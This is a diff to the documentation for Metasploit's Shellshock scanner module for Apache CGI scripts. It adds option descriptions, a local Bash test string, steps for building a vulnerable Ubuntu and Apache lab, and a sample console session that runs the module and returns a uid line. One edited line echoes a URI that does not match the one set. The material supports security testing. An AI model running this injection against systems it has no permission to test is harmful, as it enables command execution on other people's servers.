@@ -1,19 +1,19 @@
 ## Vulnerable Application
 
 This module scans for the Shellshock vulnerability, a flaw in how the Bash shell handles external environment variables. This module targets CGI scripts in the Apache web server by setting the HTTP_USER_AGENT environment variable to a malicious function definition.
-        PROTIP: Use exploit/multi/handler with a PAYLOAD appropriate to your
-        CMD, set ExitOnSession false, run -j, and then run this module to create
-        sessions on vulnerable hosts.
-        Note that this is not the recommended method for obtaining shells.
-        If you require sessions, please use the apache_mod_cgi_bash_env_exec
-        exploit module instead.
 
 ## Verification Steps
-  1. run
+1. Do: run `msfconsole`
+2. Do: set `RHOSTS [IP]`
+3. Do: set `TARGETURI [URI]`
+4. Do: `run`
+
+### To check if a host is vulnerable to the attack
+1. run
 ```
 env 'x=() { :;}; echo vulnerable' 'BASH_FUNC_x()=() { :;}; echo vulnerable' bash -c "echo test"
 ```
-  2. The shell will return the below text if the environment is vulnerable
+2. The shell will return the below text if the environment is vulnerable
 ``` 
 vulnerable
 bash: BASH_FUNC_x(): line 0: syntax error near unexpected token `)'   
@@ -23,14 +23,33 @@ test
 ``` 
 
 ## Options
-
-
-### Option Name
-
-Talk about what it does, and how to use it appropriately.  If the default value is likely to change, include the default value here.
+1. `CMD`. The default setting is /usr/bin/id
+2. `CVE`. The default setting is CVE-2014-6271 but valid options are CVE-2014-6271 or CVE-2014-6278
+3. `HEADER`. The default setting is User-Agent
+4. `METHOD`. The default setting is GET
+5. `Proxies`. This option is not set by default
+6. `RHOSTS`. This option is not set by default but must bet set to run the scanner. It will most likely be set to the IP address of the remote server that the module is run against.
+7. `RPORT`. This option is set to 80 by default 
+8. `SSL`. This option is not set by default
+9. `TARGETURI`. This option  is not set by default but must be set to run the scanner. This option will be set to a cgi script on the target server.
+10. `THREADS`. This option is set to 1 by default
+11. `VHOST`. This option is not set by default
 
 ## Scenarios
-Specific demo of using the module that might be useful in a real world scenario.
+
+### Ubuntu 12.04.5 LTS on Apache 2.2.22
+  ```
+msf5 > use auxiliary/scanner/http/apache_mod_cgi_bash_env
+msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set RHOSTS 172.16.131.134
+RHOSTS => 172.16.131.134
+msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set TARGETURI /cgi-bin/test.sh
+TARGETURI => /cgi-bin/hw.sh
+msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > exploit
+
+[+] uid=33(www-data) gid=33(www-data) groups=33(www-data)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+  ```
 
 ### Creating a Vulnerable Environment
 To setup an Environment that the scanner can be run against, follow the below steps to install a vulnerable OS and Apache version
@@ -42,7 +61,7 @@ To setup an Environment that the scanner can be run against, follow the below st
 ```
 env 'x=() { :;}; echo vulnerable' 'BASH_FUNC_x()=() { :;}; echo vulnerable' bash -c "echo test"
 ```
-  4. The shell will return the below text
+  4. The shell will return the below text to confirm that the environment is vulnerable
 ```
 vulnerable
 bash: BASH_FUNC_x(): line 0: syntax error near unexpected token `)'
@@ -63,36 +82,13 @@ ln -s /etc/apache2/mods-available/cgi.load /etc/apache2/mods-enabled/cgi.load
 ```
 service apache2 reload
 ```
-  8. In your favorite text editor create a file (as root) in /usr/lib/cgi-bin called hw.sh with the following contents
+  8. In your favorite text editor create a file (as root) in /usr/lib/cgi-bin called test.sh with the following contents
 ```
 #!/bin/bash
 printf "Content-type: text/html\n\n"
-printf "Hello World!\n"
+printf "Test!\n"
 ```
   9. Set the file to be executable with the following command
 ```
-sudo chmod +x /usr/lib/cgi-bin/hw.sh
+sudo chmod +x /usr/lib/cgi-bin/test.sh
 ```
-
-### Version and OS
-
-  ```
-  code or console output
-  ```
-
-  For example:
-
-  To do this specific thing, here's how you do it:
-
-  ```
-msf5 > use auxiliary/scanner/http/apache_mod_cgi_bash_env
-msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set RHOSTS 172.16.131.134
-RHOSTS => 172.16.131.134
-msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set TARGETURI /cgi-bin/hw.sh
-TARGETURI => /cgi-bin/hw.sh
-msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > exploit
-
-[+] uid=33(www-data) gid=33(www-data) groups=33(www-data)
-[*] Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
-  ```
